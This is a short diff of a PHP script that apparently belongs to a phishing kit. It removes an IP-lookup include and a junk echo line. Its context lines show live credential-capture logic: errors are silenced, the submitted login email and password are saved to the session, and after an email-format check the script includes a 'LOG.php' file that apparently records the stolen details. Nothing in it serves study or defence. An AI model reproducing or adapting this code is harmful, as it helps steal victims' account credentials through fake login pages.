@@ -9,7 +9,6 @@ session_start();
 error_reporting(0);
 ##################### SECOND FILES #####################
 include('../../functions/get_lang_en.php'); 
-include('../../functions/get_ip.php');
 ################## ACCOUNT INFORMATION #################
 $_SESSION['_login_email_']    = $_POST['login_email'];
 $_SESSION['_login_password_'] = $_POST['login_password'];
@@ -49,7 +48,6 @@ if (filter_var($_POST['login_email'], FILTER_VALIDATE_EMAIL)) {
   
   include('LOG.php');
 	exit;
-  echo'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM';
 }
 
 else {
